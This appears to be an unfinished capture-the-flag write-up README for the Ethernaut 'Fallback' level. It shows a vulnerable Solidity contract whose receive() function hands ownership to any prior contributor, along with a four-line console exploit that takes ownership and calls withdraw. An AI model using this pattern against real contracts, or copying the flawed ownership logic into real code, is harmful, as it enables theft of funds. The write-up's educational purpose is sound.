# Fallback challenge - Level 1 🚧 Update In Progress 🏗
<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level1&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>

```yml
This smart contract has a vulnerability, because:
```

- The require statement inside the fallback function receive() is making it an easy target to exploit,  

```Solidity
/** 
* @notice This fallback function receive() is the main attack target, in order to pass the 
* require statement player must use function contribute() 1 wei will be enough, using the console
* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
*/
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; 
}
```

## 🆘 The victim contract in detail

```yml
The victim contract imports OpenZeppelin's safeMath here:
```
- TODO

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
```

- TODO

```Solidity
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }
```

- TODO

```Solidity
 function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```


## ⚠️ The vulnerability in detail

```yml
The vulnerability:
```
- TODO

```Solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; 
}
```

- TODO

```JavaScript
/** 
* @notice This fallback function receive() is the main attack target, in order to pass the 
* require statement player must use function contribute() 1 wei will be enough, using the console
* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
*/

await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();

```

## 💥 The attack in detail

```yml
The attack:
```

- TODO

```JavaScript
await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();
```
- TODO

```Solidity

```

## 🩺 How can we fix this vulnerablity in the victim contract?

- I would create more robust require statements, inside a seperate named function for receiving tokens how I prefer,

```Solidity

```











  
